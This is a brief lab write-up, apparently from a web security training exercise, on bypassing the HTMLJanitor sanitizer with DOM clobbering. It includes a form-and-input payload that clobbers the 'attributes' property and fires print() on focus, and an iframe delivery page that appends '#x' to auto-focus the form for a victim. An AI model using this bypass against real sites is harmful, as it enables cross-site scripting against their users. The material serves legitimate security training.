goal:
    HTMLJanitor library
    construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function

    deliver to victim


analysis:
    first have to go through HTMLJanitor
        set attributes => we can bypass this attributes => use input which has and undefined length

payload:
    <form id="x" tabindex=0 onfocus="print()"><input id="attributes">
    
    submit this to comment => wait victim to submit this form
    => we can try autosubmit with tabindex id => #x

    submit this to exploit web => deliver to victim

    <iframe src="outlab/post?postid=" onload="setTimeout(()=>this.src=this.src+'#x',500)">
        try to set time out to make sure that the comment containing the injection is loaded before the js is executed
